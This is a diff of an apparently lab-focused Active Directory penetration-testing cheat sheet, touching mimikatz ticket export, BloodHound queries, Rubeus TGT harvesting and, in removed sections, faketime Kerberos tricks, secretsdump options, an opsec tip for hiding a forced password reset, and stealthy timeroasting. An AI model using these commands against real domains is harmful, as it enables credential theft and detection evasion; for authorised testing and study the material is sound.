@@ -39,9 +39,9 @@ sekurlsa::tickets /export
 dir *.kirbi
 ```
 
-## Bloodhound - Finding non-default AD groups from injestor JSON output
+## Bloodhound - Finding non-default/non-standard AD groups from injestor JSON output
 ```
-#Bloodhound - Finding non-default AD groups from injestor JSON output 
+# Bloodhound - Finding non-default/non-standard AD groups from injestor JSON output 
 # Non-default AD groups have the last part of their domains SID > 1000
  cat 20250731161542_groups.json | jq '.data[]
         | select((.ObjectIdentifier | split("-") | last | tonumber) > 1000)
@@ -49,55 +49,10 @@ dir *.kirbi
 # DNS Admin which SID > 1000 is a default group, ignore it
 ```
 
-## Faketime - Adhoc Kerberos auth
-```
-# Using faketime + ntpdate to avoid KRB_AP_ERR_SKEW(Clock skew too great)
-
-# Internal or via ligolo
-faketime "$(ntpdate -q dc01.ad.lab | cut -d ' ' -f 1,2)" \
-bloodhound-python -c All -u joan.hesther -p 'madison' -d ad.lab -ns 10.80.80.2
-
-# Through proxy or ssh
-proxychains -q faketime "$(ntpdate -q dc01.ad.lab | cut -d ' ' -f 1,2)" \ 
-bloodhound-python -c All -u joan.hesther -p 'madison' -d ad.lab -ns 10.80.80.2 --dns-tcp
-
-# source : https://notes.benheater.com/books/active-directory/page/using-faketime-for-ad-hoc-kerberos-authentication
-```
-
-## impacket - secretsdumps
-```
-Useful options :
--pwd-last-set -user-status -history
-
-Faster cracking if recent passwords are a variation of older ones that got cracked.
-
-Opsec :
-If you used ForcedPassword on a user to set a users's password
-You can revert the user's hash to its previous value to make it appear unchanged
-```
-
 ## Using NT:LM hash
 ```
 # Prepend NT hashes with ':' !(Or use NT:LM hash in its entirety) Beware of authentication failures because of this
 ```
-
-## Timeroast NTP auth abuse - Gather MD5 digest, crack to recover user's NT Hash
-```
-# Timeroast
-# Unauthenticated clients can take a list of RIDs and send MS-SNTP requests to a DC to collect MD5 digests calculated with domain computer hashes. This makes timeroasting a viable method to identify and crack pre-created machine accounts and other weak computer passwords in a stealthier manner than by using dictionaries or tools like pre2k
-#  - it can only be used to obtain computer hashes
-#  - it requires a way to map RIDs to usernames, so either NULL sessions or valid domain credentials
-
-# More advanced attack as DA :
-# Abuse this technique to find clear text password (after cracking) of a few specific users but does not want to risk getting caught, thus deciding to avoid credential extraction methods that are likely to sound alarms
-# Ioc :
-# - multiple MS-SNTP client requests sent by the same host with a different RID
-# - the RID in these requests belongs to a user and not a computer
-# - ...
-# Rq: important to note that user accounts cannot be used for interactive logons while UF_WORKSTATION_TRUST_ACCOUNT is set.
-# More here : https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac
-python timeroast.py <IP>
-````
 
 ## Rubeus - TGT ticket harvesting when Admin on a DC that is a KDC
 ```
@@ -173,41 +128,6 @@ Kerberos expects server principals name (SPN) like : cifs/DC-JPQ225.foo.vl
 4. Verify klist : klist
 ```
 
-## kerberos set-up
-```
-## kerberos set-up
-1. Domain/DC name resolution
-Once you've found a domain name + a DC for it, add to the /etc/hosts the matching resolution :
-X.X.X.X domain.tld dc.domain.tld dc01.domain.tld
-2. Set-up reamls in /etc/krb5.conf
-
-$ cat /etc/krb5.conf
-[libdefaults]
-        default_realm = default_value
-
-<SNIP>
-
-[realms]
-    INLANEFREIGHT.HTB = {
-        kdc = dc01.<DOMAIN>
-    }
-
-<SNIP>
-
-[domain_realm]
-	.csail.mit.edu = CSAIL.MIT.EDU
-	csail.mit.edu = CSAIL.MIT.EDU
-  .<FOO>.<HTB> = <FOO>.<HTB>
-  <FOO>.<HTB> = <FOO>.<HTB>
-
-2. export ccache once you have it to auth as a user : export KRB5CCNAME=<FILE TO PATH>
-3. Set-up name resolution in /etc/hosts & use the FQDN of DC in your tools
-
-- When authenticating using kerberos, replace :
-DC IP <> DC name matching in the IP in /etc/hosts
-It is especially when using kerberos authentication and avoid LDAP authentication errors
-- Specify the DC's ip for a given domain using -ns/-nameserver parameters in most tools.
-```
 
 ## Log Hygiene - useful points
 ```
